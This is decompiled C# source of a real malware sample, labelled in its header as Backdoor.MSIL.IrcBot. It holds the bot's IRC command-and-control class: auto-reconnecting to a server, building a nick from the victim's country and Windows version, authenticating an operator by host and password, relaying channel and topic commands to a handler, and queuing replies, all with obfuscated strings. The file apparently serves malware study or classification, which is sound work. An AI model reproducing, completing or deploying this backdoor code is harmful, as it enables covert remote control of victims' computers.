// Decompiled with JetBrains decompiler
// Type: 
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using Meebey.SmartIrc4net;
using System;
using System.Collections;
using System.Globalization;
using System.Text;
using System.Timers;

internal class \uE014
{
  private static Queue \uE006 = new Queue();
  private static Queue \uE005 = new Queue();
  private static Queue \uE004 = new Queue();
  private static string \uE003 = "";
  private static Timer \uE002 = new Timer();
  private static IrcClient \uE001 = new IrcClient();
  private static DateTime \uE000 = DateTime.MinValue;

  internal static void \uE005()
  {
    \uE014.\uE002.AutoReset = true;
    \uE014.\uE002.Interval = 100.0;
    \uE014.\uE002.Elapsed += new ElapsedEventHandler(\uE014.\uE000);
    \uE014.\uE002.Start();
    \uE014.\uE001.AutoReconnect = true;
    \uE014.\uE001.AutoRetry = true;
    \uE014.\uE001.AutoRejoin = true;
    \uE014.\uE001.OnReadLine += new ReadLineEventHandler(\uE014.\uE000);
    \uE014.\uE001.OnConnected += new EventHandler(\uE014.\uE000);
    \uE014.\uE001.OnQueryMessage += new IrcEventHandler(\uE014.\uE000);
    \uE014.\uE001.OnTopic += new TopicEventHandler(\uE014.\uE000);
    \uE014.\uE001.OnTopicChange += new TopicChangeEventHandler(\uE014.\uE000);
    \uE014.\uE001.OnChannelMessage += new IrcEventHandler(\uE014.\uE000);
    \uE014.\uE001.Connect(\uE001.\uE00D, \uE001.\uE00C);
  }

  private static void \uE000(object _param0, TopicChangeEventArgs _param1) => \uE011.\uE000(_param1.NewTopic);

  private static void \uE000(object _param0, TopicEventArgs _param1) => \uE011.\uE000(_param1.Topic);

  private static void \uE000(object _param0, IrcEventArgs _param1)
  {
    try
    {
      if (!(_param1.Data.Host == \uE001.\uE008))
        return;
      if (\uE014.\uE003 == _param1.Data.Nick)
      {
        if (_param1.Data.Message.StartsWith(\uE01B.\uE000("\uF3AC\uF3EE\uF3ED\uF3F7\uF3F6", 62338)))
          \uE014.\uE000();
        else
          \uE011.\uE000(_param1.Data.Message);
      }
      else
      {
        if (!_param1.Data.Message.StartsWith(\uE01B.\uE000("\uE398\uE3DA\uE3DF\uE3D8", 58294)))
          return;
        _param1.Data.Message.Substring(_param1.Data.Message.IndexOf(\uE01B.\uE000("\uE372", 58194)) + 1).Substring(0);
        if (!(_param1.Data.Message.Substring(_param1.Data.Message.IndexOf(\uE01B.\uE000("\uE372", 58194)) + 1) == \uE001.\uE006))
          return;
        \uE014.\uE000 = DateTime.Now.AddMinutes(5.0);
        \uE014.\uE003 = _param1.Data.Nick;
        \uE014.\uE002(\uE01B.\uE000("\uF017\uF014\uF01C\uF01C\uF01E\uF01F\uF05B\uF012\uF015", 61563));
      }
    }
    catch
    {
    }
  }

  private static void \uE000(object _param0, ReadLineEventArgs _param1)
  {
    if (!_param1.Line.StartsWith(\uE01B.\uE000("\uF2EC\uF2F5\uF2F2\uF2FB", 62140)))
      return;
    string str = _param1.Line.Split(' ')[1];
    \uE014.\uE001.WriteLine(\uE01B.\uE000("\uEA45\uEA5A\uEA5B\uEA52\uEA35", 59925) + str, Priority.Critical);
  }

  private static void \uE000(object _param0, EventArgs _param1)
  {
    Random random = new Random();
    \uE014.\uE001.Login(\uE014.\uE003(), random.Next(100000).ToString(), 0, random.Next(100000).ToString());
    \uE014.\uE001.RfcJoin(\uE001.\uE00A);
    \uE014.\uE001.Listen();
  }

  private static void \uE000(object _param0, ElapsedEventArgs _param1)
  {
    try
    {
      if (\uE014.\uE001.IsConnected)
      {
        while (\uE014.\uE006.Count > 0)
          \uE014.\uE001.SendMessage(SendType.Message, \uE001.\uE00A, \uE014.\uE006.Dequeue().ToString());
        while (\uE014.\uE005.Count > 0)
          \uE014.\uE001.SendMessage(SendType.Message, \uE001.\uE009, \uE014.\uE005.Dequeue().ToString());
        while (\uE014.\uE004.Count > 0)
          \uE014.\uE001.SendMessage(SendType.Message, \uE001.\uE007, \uE014.\uE004.Dequeue().ToString());
      }
    }
    catch
    {
    }
    try
    {
      if (!(\uE014.\uE003 != "") || !(DateTime.Now >= \uE014.\uE000))
        return;
      \uE014.\uE000();
    }
    catch
    {
    }
  }

  private static void \uE000()
  {
    \uE014.\uE003 = "";
    \uE014.\uE002(\uE01B.\uE000("\uF3AB\uF3A8\uF3A0\uF3A0\uF3A2\uF3A3\uF3E7\uF3A8\uF3B2\uF3B3", 62407));
  }

  private static string \uE004()
  {
    Random random = new Random();
    return \uE01B.\uE000("\uF08C\uF08A\uF09C\uF08B\uF0F9", 61657) + (object) random.Next(100000) + \uE01B.\uE000("\uEF6D\uEF7D\uEF6D\uEF67\uEF6D\uEF77", 61261) + (object) random.Next(100000);
  }

  private static string \uE003()
  {
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Append(\uE01B.\uE000("\uE47B", 58400));
    stringBuilder.Append(RegionInfo.CurrentRegion.ThreeLetterISORegionName.ToUpper());
    stringBuilder.Append(\uE01B.\uE000("\uE5D1", 58797));
    stringBuilder.Append(\uE014.\uE000());
    stringBuilder.Append(\uE01B.\uE000("\uE5D1", 58797));
    stringBuilder.Append(random.Next(1000000).ToString().PadLeft(6, '0'));
    stringBuilder.Append(\uE01B.\uE000("\uED5E", 60675));
    return stringBuilder.ToString();
  }

  private static string \uE000()
  {
    string str = "";
    if (Environment.OSVersion.Version.Major == 4 && Environment.OSVersion.Version.Minor == 0)
    {
      if (Environment.OSVersion.Platform == PlatformID.Win32Windows)
        str = \uE01B.\uE000("\uECC5\uECC9", 60668);
      if (Environment.OSVersion.Platform == PlatformID.Win32NT)
        str = \uE01B.\uE000("\uE7BF\uE7A5", 59377);
    }
    else
      str = Environment.OSVersion.Version.Major != 4 || Environment.OSVersion.Version.Minor != 10 ? (Environment.OSVersion.Version.Major != 4 || Environment.OSVersion.Version.Minor != 90 ? (Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor != 0 ? (Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor != 1 ? (Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor != 2 ? \uE01B.\uE000("\uE29A\uE284\uE283", 58061) : \uE01B.\uE000("\uE9DF\uE9A6\uE9DE", 59885)) : \uE01B.\uE000("\uF5AC\uF5A4", 62964)) : \uE01B.\uE000("\uF42D\uF454", 62495)) : \uE01B.\uE000("\uEE12\uEE1A", 61023)) : \uE01B.\uE000("\uEF32\uEF33", 61195);
    return str;
  }

  public static void \uE002(string _param0) => \uE014.\uE006.Enqueue((object) _param0);

  public static void \uE001(string _param0) => \uE014.\uE005.Enqueue((object) _param0);

  internal static void \uE000(string _param0) => \uE014.\uE004.Enqueue((object) _param0);
}
